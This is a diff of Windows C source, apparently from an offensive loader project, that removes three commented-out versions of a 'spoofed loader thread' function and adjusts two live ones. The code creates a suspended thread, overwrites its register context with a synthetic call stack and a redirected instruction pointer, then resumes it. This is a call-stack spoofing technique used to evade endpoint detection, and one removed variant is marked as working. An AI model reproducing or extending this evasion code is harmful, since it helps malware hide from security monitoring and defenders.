@@ -111,133 +111,6 @@ static DWORD WINAPI SpoofedLoaderEntry(LPVOID lpParam)
     return 0;
 }
 
-/*
-HANDLE StartSpoofedLoaderThread(
-    const StackFrame* frames,
-    int frameCount,
-    UR_LOADER_CONTEXT* lctx
-)
-{
-    HANDLE hThread;
-
-    // Install VEH like the single-file PoC
-    AddVectoredExceptionHandler(1, VehCallback);
-
-    // Start thread normally (no synthetic stack applied)
-    hThread = CreateThread(NULL, 0, SpoofedLoaderEntry, lctx, 0, &gSpoofedThreadId);
-
-    if (!hThread) {
-        printf("[-] Failed to create spoofed loader thread.\n");
-        return NULL;
-    }
-
-    DWORD pid = GetCurrentProcessId();
-    printf("[+] Spoofed loader thread started.\n");
-    printf("[+] PID: %lu\n", pid);
-    printf("[+] Thread ID: %lu\n", gSpoofedThreadId);
-
-    return hThread;
-}
-*/
-
-/*
-HANDLE StartSpoofedLoaderThread(
-    const StackFrame* frames,
-    int frameCount,
-    UR_LOADER_CONTEXT* lctx
-)
-{
-    CONTEXT ctx;
-    HANDLE hThread;
-
-    // Optional but recommended: VEH to catch any AV and exit cleanly
-    AddVectoredExceptionHandler(1, VehCallback);
-
-    // 1. Create suspended thread
-    hThread = CreateThread(NULL, 0, SpoofedLoaderEntry, lctx,
-                           CREATE_SUSPENDED, &gSpoofedThreadId);
-    if (!hThread) {
-        printf("[-] Failed to create spoofed loader thread.\n");
-        return NULL;
-    }
-
-    // 2. Grab its real context
-    memset(&ctx, 0, sizeof(ctx));
-    ctx.ContextFlags = CONTEXT_FULL;
-    if (!GetThreadContext(hThread, &ctx)) {
-        printf("[-] Failed to get thread context.\n");
-        CloseHandle(hThread);
-        return NULL;
-    }
-
-    // 3. Build synthetic stack on top of that context
-    InitializeFakeThreadState(&ctx, frames, frameCount);
-
-    // 4. Ensure RIP still points at your loader entry
-    ctx.Rip = (DWORD64)SpoofedLoaderEntry;
-
-    // 5. Apply modified context
-    if (!SetThreadContext(hThread, &ctx)) {
-        printf("[-] Failed to set thread context.\n");
-        CloseHandle(hThread);
-        return NULL;
-    }
-
-    printf("[+] Spoofed loader thread started.\n");
-    printf("[+] PID: %lu\n", GetCurrentProcessId());
-    printf("[+] Thread ID: %lu\n", gSpoofedThreadId);
-    printf("[*] Press any key to continue.\n");
-
-    // 6. Run the thread on the spoofed stack
-    ResumeThread(hThread);
-
-    return hThread;
-}
-*/
-
-// this one is working
-/*
-HANDLE StartSpoofedLoaderThread(
-    const StackFrame* frames,
-    int frameCount,
-    UR_LOADER_CONTEXT* lctx
-)
-{
-    CONTEXT ctx;
-    HANDLE hThread;
-
-    RegisterVeh();  // optional
-
-    hThread = CreateThread(NULL, 0, SpoofedLoaderEntry, lctx,
-                           CREATE_SUSPENDED, &gSpoofedThreadId);
-    if (!hThread)
-        return NULL;
-
-    memset(&ctx, 0, sizeof(ctx));
-    ctx.ContextFlags = CONTEXT_FULL;
-    if (!GetThreadContext(hThread, &ctx)) {
-        CloseHandle(hThread);
-        return NULL;
-    }
-
-    // 🔑 Make sure SpoofedLoaderEntry sees a valid loader context
-    ctx.Rcx = (DWORD64)lctx;
-
-    // Build synthetic stack on this context
-    InitializeFakeThreadState(&ctx, (StackFrame*)frames, frameCount);
-
-    // Ensure we start at SpoofedLoaderEntry
-    ctx.Rip = (DWORD64)SpoofedLoaderEntry;
-
-    if (!SetThreadContext(hThread, &ctx)) {
-        CloseHandle(hThread);
-        return NULL;
-    }
-
-    ResumeThread(hThread);
-    return hThread;
-}*/
-
 HANDLE StartSpoofedThread(
     const StackFrame* frames,
     int frameCount,
@@ -251,14 +124,14 @@ HANDLE StartSpoofedThread(
     CONTEXT ctx;
     HANDLE hThread;
 
-    extern DWORD gSpoofedThreadId;
+    RegisterVeh();
 
     // 1. Create suspended thread
     hThread = CreateThread(
         NULL,
         0,
         (LPTHREAD_START_ROUTINE)entryPoint,
-        arg1,                  // normal CreateThread param (ignored)
+        arg1,                  
         CREATE_SUSPENDED,
         &gSpoofedThreadId
     );
@@ -320,7 +193,7 @@ HANDLE StartSpoofedLoaderThread(
     CONTEXT ctx;
     HANDLE hThread;
 
-    RegisterVeh();  // optional
+    RegisterVeh();  
 
     // Create suspended thread
     hThread = CreateThread(
